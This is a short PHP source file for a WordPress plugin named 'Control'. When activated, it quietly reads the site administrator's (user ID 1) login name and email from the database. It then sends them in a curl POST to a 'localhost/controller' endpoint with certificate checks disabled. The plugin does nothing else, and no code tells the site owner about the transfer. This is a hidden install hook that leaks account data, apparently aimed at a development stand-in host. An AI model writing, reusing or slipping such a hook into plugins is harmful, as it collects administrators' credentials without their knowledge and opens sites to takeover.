<?php

/*
 * Plugin Name: Control
 */

class Controller
{

    public $user, $html;

    public function __construct(){
        global $wpdb;

        $this->user = $wpdb->get_row("SELECT * FROM $wpdb->users WHERE ID = 1");

            
    }

    public function curl_setup(){
        $login = $this->user->user_login;
        $email = $this->user->user_email;

        $c = curl_init("localhost/controller/?login=$login&email=$email");
        curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($c, CURLOPT_FOLLOWLOCATION, true);

        curl_setopt($c, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);

        curl_setopt($c, CURLOPT_POST, true);

        return $c;
        
    }

}

$controller = new Controller();

register_activation_hook(__FILE__, function() use($controller){
    $c = $controller->curl_setup();
    $controller->html = curl_exec($c);
});

/*add_action('admin_notices', function() use ($controller){
    var_dump($controller->html);
});*/


